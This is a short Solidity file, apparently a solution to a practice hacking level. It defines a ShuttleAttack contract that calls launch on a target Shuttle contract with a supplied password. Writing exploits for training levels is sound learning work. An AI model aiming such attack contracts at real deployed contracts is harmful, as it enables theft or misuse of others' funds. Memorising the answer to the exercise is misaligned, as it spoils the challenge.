pragma solidity ^0.4.24;

import '../levels/Shuttle.sol';

contract ShuttleAttack {
  function attack(address _target, bytes32 _password) public {
    Shuttle shuttle = Shuttle(_target);
    shuttle.launch(_password);
  }
}
